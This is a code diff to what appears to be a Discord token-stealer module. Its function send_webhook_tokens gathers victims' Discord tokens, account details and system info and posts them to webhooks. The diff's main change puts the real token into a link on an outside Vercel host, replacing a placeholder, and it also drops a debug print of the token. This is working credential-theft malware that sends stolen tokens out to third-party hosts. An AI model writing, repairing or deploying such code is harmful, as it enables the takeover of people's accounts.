@@ -1,5 +1,5 @@
 import { get_info } from "./../../modules/core/core.mjs";
-import get_discord_Info from "./../../utils/axios/discord.mjs";
+import { get_discord_Info } from "./../../utils/axios/discord.mjs";
 
 import { instance } from "./../../utils/axios/request.mjs";
 
@@ -66,11 +66,9 @@ export const send_webhook_tokens = async (webhook) => {
             }
             if (!infos) continue;
 
-            const copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=x`;
+            const copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
             const discord = await get_discord_Info(token);
             const system = await get_info();
-
-            console.log(token)
             
             webhook.forEach(async (webhook) => {
                 try {
@@ -82,7 +80,7 @@ export const send_webhook_tokens = async (webhook) => {
                             "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
                             "embeds": [{
                                 "author": {
-                                    "name": `${discord["username"]} | ${discord.ID}`,
+                                    "name": `${discord.username} | ${discord.ID}`,
                                     "icon_url": discord.avatar
                                 },
                                 "thumbnail": {
